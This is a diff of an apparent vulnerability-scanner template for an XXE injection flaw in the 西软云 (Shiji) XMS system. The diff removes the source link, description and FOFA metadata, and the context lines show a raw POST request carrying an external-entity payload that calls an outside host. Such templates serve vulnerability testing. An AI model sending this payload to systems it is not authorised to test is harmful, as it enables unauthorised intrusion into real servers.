@@ -3,12 +3,8 @@ info:
   name: 西软云 XML 实体注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tskbzptzim3apusg'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tskbzptzim3apusg
-    fofa: app="shiji-西软云XMS"
 http:
 - raw:
   - 'POST /ItfServerRS/rest/ideas/getresponseasync HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wwwbaidu.com"> %remote;]>
